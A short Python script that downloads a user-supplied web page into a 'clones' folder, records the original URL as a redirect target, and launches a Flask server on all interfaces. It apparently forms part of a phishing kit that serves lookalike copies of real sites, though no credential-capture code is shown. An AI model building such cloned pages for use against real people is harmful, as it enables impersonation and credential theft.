from urllib.request import urlopen, Request
import os

def main():
    websiteURL = input("Insert Website URL:")
    websiteURL = websiteURL.strip()
    try:
        hdr = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)' }
        request = Request(websiteURL, headers=hdr)
        info = urlopen(request)
    except ValueError:
        print("Error: That is not a correct URL format. EX.) {\'http://www.website.com\'} or {\'https://www.purdue.edu\'}")
        return
    
    with open("clones/page.html", "wb") as fid:
        fid.write(info.read())
    

    redirectURLFile = open("redirectURL.txt", "w")
    redirectURLFile.write(websiteURL)
    redirectURLFile.close()
    
    os.system('flask run --host=0.0.0.0')


if __name__ == "__main__":
    main()
